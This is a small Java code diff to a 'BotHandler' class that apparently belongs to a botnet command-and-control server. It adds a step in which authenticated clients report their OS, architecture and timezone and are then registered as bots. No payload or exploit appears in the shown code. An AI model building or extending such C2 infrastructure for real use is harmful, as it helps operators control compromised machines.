@@ -3,6 +3,8 @@ package me.aaronakhtar.jbot.threads.handlers;
 import me.aaronakhtar.jbot.Main;
 import me.aaronakhtar.jbot.Utilities;
 import me.aaronakhtar.jbot.crypto.Aes;
+import me.aaronakhtar.jbot.objects.Bot;
+import me.aaronakhtar.jbot.objects.ConnectionType;
 
 import java.io.BufferedReader;
 import java.io.InputStreamReader;
@@ -28,8 +30,18 @@ public class BotHandler implements Runnable {
 
             if ((input = bufferedReader.readLine()) != null){
                 if (Aes.decrypt(input, Main.encryptionKey).equals(authPassword)){
-                    isAuthenticated = true;
-                    Main.connectedBots.add(this.socket);
+
+                    if ((input = bufferedReader.readLine()) != null){
+                        if ((input = Aes.decrypt(input, Main.encryptionKey)) != null){
+                                                        // os#arch#timezone
+                            final String[] is = input.split("#");
+                            final Bot bot = new Bot(socket, is[0], is[1], is[2]);
+                            isAuthenticated = true;
+                            Main.connectedBots.add(bot);
+                            Utilities.sendJoinMessage(ConnectionType.BOT, bot, null);
+                        }
+                    }
+
                     return;
                 }
             }
